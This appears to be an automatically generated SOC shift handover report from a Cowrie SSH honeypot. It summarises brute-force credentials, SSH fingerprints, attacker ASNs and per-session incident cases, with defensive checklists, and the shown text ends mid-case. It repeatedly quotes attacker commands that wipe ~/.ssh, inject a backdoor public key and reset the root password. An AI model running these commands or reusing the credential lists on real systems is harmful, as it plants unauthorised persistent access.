# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-14 |
| **Generated At** | 2026-04-14T13:52:20Z |
| **Shift Time** | 13:52 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **1363** |
| Confirmed Threats | **1361** |
| False Positives Filtered | **2** (0.1%) |
| Unique Attacker IPs | **19** |
| Countries of Origin | **9** |
| High Severity Cases | **83** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **1280** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **194** |
| Unique Credential Pairs | **109** |
| Unique Usernames | **50** |
| Unique Passwords | **102** |
| Successful Auth Pairs | **52** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 83 |
| `345gs5662d34` | 41 |
| `ubuntu` | 12 |
| `steam` | 4 |
| `user` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 41 |
| `3245gs5662d34` | 41 |
| `123456` | 5 |
| `chromeuser` | 2 |
| `arcsight` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 41 |
| `root` | `3245gs5662d34` | 41 |
| `chromeuser` | `chromeuser` | 2 |
| `root` | `arcsight` | 2 |
| `root` | `Admin2025@#` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `arcsight` | `222.110.147.56` | 2026-04-14T11:46:25 |
| `root` | `3245gs5662d34` | `222.110.147.56` | 2026-04-14T11:46:29 |
| `root` | `Admin2025@#` | `217.154.178.95` | 2026-04-14T11:47:45 |
| `root` | `3245gs5662d34` | `217.154.178.95` | 2026-04-14T11:47:48 |
| `root` | `xxxxxxxx` | `45.64.74.51` | 2026-04-14T11:49:56 |
| `root` | `3245gs5662d34` | `45.64.74.51` | 2026-04-14T11:49:59 |
| `root` | `Qwertyuiop1234!` | `219.150.93.157` | 2026-04-14T11:53:19 |
| `root` | `XXbb1234` | `45.169.128.70` | 2026-04-14T11:53:43 |
| `root` | `3245gs5662d34` | `45.169.128.70` | 2026-04-14T11:53:51 |
| `root` | `admin@123.com` | `34.85.163.94` | 2026-04-14T11:54:41 |
| `root` | `3245gs5662d34` | `34.85.163.94` | 2026-04-14T11:54:47 |
| `root` | `P@ssword` | `34.85.163.94` | 2026-04-14T11:58:15 |
| `root` | `Aa123456789@` | `45.169.128.70` | 2026-04-14T11:59:21 |
| `root` | `p@ssword` | `34.85.163.94` | 2026-04-14T12:01:42 |
| `root` | `Qazwsx9999.` | `34.85.163.94` | 2026-04-14T12:03:35 |
| `root` | `123456Qq@` | `13.81.183.29` | 2026-04-14T12:07:17 |
| `root` | `3245gs5662d34` | `13.81.183.29` | 2026-04-14T12:07:21 |
| `root` | `qazwsx2023!@` | `13.81.183.29` | 2026-04-14T12:10:32 |
| `root` | `1q2w#E$R` | `34.85.163.94` | 2026-04-14T12:10:51 |
| `root` | `1Qazxsw@` | `13.81.183.29` | 2026-04-14T12:12:06 |
| `root` | `arcsight` | `34.85.163.94` | 2026-04-14T12:12:37 |
| `root` | `Zxcv1234.` | `119.18.55.118` | 2026-04-14T12:14:45 |
| `root` | `3245gs5662d34` | `119.18.55.118` | 2026-04-14T12:14:47 |
| `root` | `Abcd1234!` | `13.81.183.29` | 2026-04-14T12:16:55 |
| `root` | `root!2026` | `45.169.128.70` | 2026-04-14T12:18:08 |
| `root` | `Qazwsx12345!@` | `171.25.158.82` | 2026-04-14T12:18:10 |
| `root` | `3245gs5662d34` | `171.25.158.82` | 2026-04-14T12:18:14 |
| `root` | `A123456..` | `20.255.56.84` | 2026-04-14T12:18:58 |
| `root` | `3245gs5662d34` | `20.255.56.84` | 2026-04-14T12:19:01 |
| `root` | `Aa1234567` | `34.85.163.94` | 2026-04-14T12:25:15 |
| `root` | `root123123!` | `45.169.128.70` | 2026-04-14T12:25:53 |
| `root` | `qazwsx1111@123` | `13.81.183.29` | 2026-04-14T12:26:22 |
| `root` | `Admin2025@#` | `45.169.128.70` | 2026-04-14T12:27:47 |
| `root` | `a1234567!` | `13.81.183.29` | 2026-04-14T12:28:02 |
| `root` | `bbBB123123` | `43.128.149.159` | 2026-04-14T12:28:05 |
| `root` | `3245gs5662d34` | `43.128.149.159` | 2026-04-14T12:28:08 |
| `root` | `1234qwer` | `34.85.163.94` | 2026-04-14T12:28:53 |
| `root` | `Root1` | `45.169.128.70` | 2026-04-14T12:29:40 |
| `root` | `h4ck3r` | `43.128.149.159` | 2026-04-14T12:29:49 |
| `root` | `Hello12345` | `34.85.163.94` | 2026-04-14T12:30:37 |
| `root` | `Root2019@` | `43.128.149.159` | 2026-04-14T12:31:31 |
| `root` | `XXzz1234` | `45.169.128.70` | 2026-04-14T12:31:31 |
| `root` | `Qazwsx11111..` | `45.169.128.70` | 2026-04-14T12:35:18 |
| `root` | `QQqq1234` | `43.128.149.159` | 2026-04-14T12:42:11 |
| `root` | `ZZqq123` | `43.128.149.159` | 2026-04-14T12:43:55 |
| `root` | `Zxcv1234.` | `43.128.149.159` | 2026-04-14T12:45:38 |
| `root` | `456789` | `43.128.149.159` | 2026-04-14T12:47:29 |
| `root` | `123_ASDF` | `43.128.149.159` | 2026-04-14T12:49:19 |
| `root` | `Qazwsx12345!@` | `43.128.149.159` | 2026-04-14T12:51:07 |
| `root` | `123456a.` | `43.128.149.159` | 2026-04-14T12:56:32 |
| `root` | `ZAQ!2wsx2023@#` | `43.128.149.159` | 2026-04-14T12:58:17 |
| `root` | `ZAQ!2wsx54321@@` | `43.128.149.159` | 2026-04-14T13:00:02 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **1363** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 210 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 209 | 14 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 209 | 14 | Modern SSH client |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 41 | 10 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:IauFST0uFrCy"|chpasswd|bash
```
```
cat /proc/cpuinfo | grep model | grep name | wc -l
```
Source IPs: `219.150.93.157`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `45.169.128.70`, `119.18.55.118`, `13.81.183.29`, `34.85.163.94`, `20.255.56.84`, `45.64.74.51`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **19** |
| Unique ASNs | **17** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |
| `AS268114` | THM Tecnologia Net Ltda | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS394695` | PDR | 1 | HIGH |
| `AS35100` | Patrik Lagerman | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (83)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d020ed5e7491

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-04-14 11:46 |
| **Last Seen** | 2026-04-14 11:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 11:46:24` | `cowrie.session.connect` |
| `2026-04-14 11:46:24` | `cowrie.client.version` |
| `2026-04-14 11:46:24` | `cowrie.client.kex` |
| `2026-04-14 11:46:25` | `cowrie.login.success` |
| `2026-04-14 11:46:25` | `cowrie.session.params` |
| `2026-04-14 11:46:25` | `cowrie.command.input` |
| `2026-04-14 11:46:25` | `cowrie.command.failed` |
| `2026-04-14 11:46:25` | `cowrie.log.closed` |
| `2026-04-14 11:46:26` | `cowrie.session.params` |
| `2026-04-14 11:46:26` | `cowrie.command.input` |
| `2026-04-14 11:46:26` | `cowrie.session.file_download` |
| `2026-04-14 11:46:26` | `cowrie.log.closed` |
| `2026-04-14 11:46:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34f606bc99a2

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-04-14 11:46 |
| **Last Seen** | 2026-04-14 11:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 11:46:28` | `cowrie.session.connect` |
| `2026-04-14 11:46:28` | `cowrie.client.version` |
| `2026-04-14 11:46:28` | `cowrie.client.kex` |
| `2026-04-14 11:46:29` | `cowrie.login.success` |
| `2026-04-14 11:46:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-299aaf760aa1

| Field | Detail |
|---|---|
| **Source IP** | `217.154.178[.]95` |
| **First Seen** | 2026-04-14 11:47 |
| **Last Seen** | 2026-04-14 11:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 11:47:44` | `cowrie.session.connect` |
| `2026-04-14 11:47:44` | `cowrie.client.version` |
| `2026-04-14 11:47:44` | `cowrie.client.kex` |
| `2026-04-14 11:47:45` | `cowrie.login.success` |
| `2026-04-14 11:47:45` | `cowrie.session.params` |
| `2026-04-14 11:47:45` | `cowrie.command.input` |
| `2026-04-14 11:47:45` | `cowrie.command.failed` |
| `2026-04-14 11:47:45` | `cowrie.log.closed` |
| `2026-04-14 11:47:45` | `cowrie.session.params` |
| `2026-04-14 11:47:45` | `cowrie.command.input` |
| `2026-04-14 11:47:45` | `cowrie.session.file_download` |
| `2026-04-14 11:47:45` | `cowrie.log.closed` |
| `2026-04-14 11:47:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.178[.]95` to AbuseIPDB if not already reported
- [ ] Block `217.154.178[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b83bb6abd9a

| Field | Detail |
|---|---|
| **Source IP** | `217.154.178[.]95` |
| **First Seen** | 2026-04-14 11:47 |
| **Last Seen** | 2026-04-14 11:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 11:47:48` | `cowrie.session.connect` |
| `2026-04-14 11:47:48` | `cowrie.client.version` |
| `2026-04-14 11:47:48` | `cowrie.client.kex` |
| `2026-04-14 11:47:48` | `cowrie.login.success` |
| `2026-04-14 11:47:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.178[.]95` to AbuseIPDB if not already reported
- [ ] Block `217.154.178[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fe9b285cf9c

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-14 11:49 |
| **Last Seen** | 2026-04-14 11:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 11:49:56` | `cowrie.session.connect` |
| `2026-04-14 11:49:56` | `cowrie.client.version` |
| `2026-04-14 11:49:56` | `cowrie.client.kex` |
| `2026-04-14 11:49:56` | `cowrie.login.success` |
| `2026-04-14 11:49:56` | `cowrie.session.params` |
| `2026-04-14 11:49:56` | `cowrie.command.input` |
| `2026-04-14 11:49:56` | `cowrie.command.failed` |
| `2026-04-14 11:49:57` | `cowrie.log.closed` |
| `2026-04-14 11:49:57` | `cowrie.session.params` |
| `2026-04-14 11:49:57` | `cowrie.command.input` |
| `2026-04-14 11:49:57` | `cowrie.session.file_download` |
| `2026-04-14 11:49:57` | `cowrie.log.closed` |
| `2026-04-14 11:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95ec656d8c50

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-14 11:49 |
| **Last Seen** | 2026-04-14 11:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 11:49:59` | `cowrie.session.connect` |
| `2026-04-14 11:49:59` | `cowrie.client.version` |
| `2026-04-14 11:49:59` | `cowrie.client.kex` |
| `2026-04-14 11:49:59` | `cowrie.login.success` |
| `2026-04-14 11:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1645fa70aefa

| Field | Detail |
|---|---|
| **Source IP** | `219.150.93[.]157` |
| **First Seen** | 2026-04-14 11:53 |
| **Last Seen** | 2026-04-14 11:54 |
| **Session Duration** | 66s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:IauFST0uFrCy"|chpasswd|bash, cat /proc/cpuinfo | grep model | grep name | wc -l` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 11:53:18` | `cowrie.session.connect` |
| `2026-04-14 11:53:18` | `cowrie.client.version` |
| `2026-04-14 11:53:18` | `cowrie.client.kex` |
| `2026-04-14 11:53:19` | `cowrie.login.success` |
| `2026-04-14 11:53:19` | `cowrie.session.params` |
| `2026-04-14 11:53:19` | `cowrie.command.input` |
| `2026-04-14 11:53:19` | `cowrie.command.failed` |
| `2026-04-14 11:53:19` | `cowrie.log.closed` |
| `2026-04-14 11:53:19` | `cowrie.session.params` |
| `2026-04-14 11:53:19` | `cowrie.command.input` |
| `2026-04-14 11:53:20` | `cowrie.session.file_download` |
| `2026-04-14 11:53:20` | `cowrie.log.closed` |
| `2026-04-14 11:53:32` | `cowrie.session.params` |
| `2026-04-14 11:53:32` | `cowrie.command.input` |
| `2026-04-14 11:53:32` | `cowrie.log.closed` |
| `2026-04-14 11:54:20` | `cowrie.session.params` |
| `2026-04-14 11:54:20` | `cowrie.command.input` |
| `2026-04-14 11:54:20` | `cowrie.log.closed` |
| `2026-04-14 11:54:21` | `cowrie.session.params` |
| `2026-04-14 11:54:21` | `cowrie.command.input` |
| `2026-04-14 11:54:21` | `cowrie.log.closed` |
| `2026-04-14 11:54:21` | `cowrie.session.params` |
| `2026-04-14 11:54:21` | `cowrie.command.input` |
| `2026-04-14 11:54:21` | `cowrie.log.closed` |
| `2026-04-14 11:54:22` | `cowrie.session.params` |
| `2026-04-14 11:54:22` | `cowrie.command.input` |
| `2026-04-14 11:54:22` | `cowrie.log.closed` |
| `2026-04-14 11:54:22` | `cowrie.session.params` |
| `2026-04-14 11:54:22` | `cowrie.command.input` |
| `2026-04-14 11:54:23` | `cowrie.log.closed` |
| `2026-04-14 11:54:23` | `cowrie.session.params` |
| `2026-04-14 11:54:23` | `cowrie.command.input` |
| `2026-04-14 11:54:23` | `cowrie.log.closed` |
| `2026-04-14 11:54:24` | `cowrie.session.params` |
| `2026-04-14 11:54:24` | `cowrie.command.input` |
| `2026-04-14 11:54:24` | `cowrie.log.closed` |
| `2026-04-14 11:54:24` | `cowrie.session.params` |
| `2026-04-14 11:54:24` | `cowrie.command.input` |
| `2026-04-14 11:54:24` | `cowrie.log.closed` |
| `2026-04-14 11:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.150.93[.]157` to AbuseIPDB if not already reported
- [ ] Block `219.150.93[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62064404de29

| Field | Detail |
|---|---|
| **Source IP** | `45.169.128[.]70` |
| **First Seen** | 2026-04-14 11:53 |
| **Last Seen** | 2026-04-14 11:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 11:53:42` | `cowrie.session.connect` |
| `2026-04-14 11:53:42` | `cowrie.client.version` |
| `2026-04-14 11:53:42` | `cowrie.client.kex` |
| `2026-04-14 11:53:43` | `cowrie.login.success` |
| `2026-04-14 11:53:44` | `cowrie.session.params` |
| `2026-04-14 11:53:44` | `cowrie.command.input` |
| `2026-04-14 11:53:44` | `cowrie.command.failed` |
| `2026-04-14 11:53:44` | `cowrie.log.closed` |
| `2026-04-14 11:53:45` | `cowrie.session.params` |
| `2026-04-14 11:53:45` | `cowrie.command.input` |
| `2026-04-14 11:53:45` | `cowrie.session.file_download` |
| `2026-04-14 11:53:45` | `cowrie.log.closed` |
| `2026-04-14 11:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.169.128[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b162e7fe8d1d

| Field | Detail |
|---|---|
| **Source IP** | `45.169.128[.]70` |
| **First Seen** | 2026-04-14 11:53 |
| **Last Seen** | 2026-04-14 11:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 11:53:49` | `cowrie.session.connect` |
| `2026-04-14 11:53:49` | `cowrie.client.version` |
| `2026-04-14 11:53:49` | `cowrie.client.kex` |
| `2026-04-14 11:53:51` | `cowrie.login.success` |
| `2026-04-14 11:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.169.128[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aa04c10e7e0

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 11:54 |
| **Last Seen** | 2026-04-14 11:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
